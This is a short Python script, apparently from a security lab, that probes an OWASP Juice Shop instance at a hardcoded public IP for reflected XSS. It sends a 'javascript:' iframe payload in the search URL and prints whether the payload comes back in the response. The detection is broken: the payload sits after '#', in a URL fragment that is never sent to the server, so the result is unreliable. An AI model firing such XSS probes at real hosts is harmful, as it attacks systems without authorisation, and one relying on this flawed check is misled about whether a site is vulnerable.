#!/usr/bin/env python3
import requests
import urllib.parse

def simulate_reflected_xss(base_url, xss_payload):
    """
    :param base_url: L'URL de base de l'application Juice Shop
                     (ex. http://localhost:3000).
    :param xss_payload: Le script/morceau de code malveillant à injecter
                        (ex. <script>alert('XSS')</script>).
    :return: True si le payload XSS est repéré dans la réponse, sinon False.
    """
    encoded_payload = urllib.parse.quote(xss_payload)
    xss_url = f"{base_url}/#/search?q={encoded_payload}"
    print(xss_url)
    try:
        response = requests.get(xss_url, headers={"Accept-Encoding": "identity"})


        print(f"Request status: {response.status_code}")
        print(f"Response:\n{response.text}")

        if xss_payload in response.text:
            print("[+] XSS Payload found in the response. Potential Reflected XSS!")
            return True
        else:
            print("[-] Payload not reflected in the response.")
            return False

    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return False

if __name__ == "__main__":
    base_url = "http://45.76.47.218:3000"
    malicious_script = "<iframe src='javascript:alert(`XSS6`)'></iframe>"

    simulate_reflected_xss(base_url, malicious_script)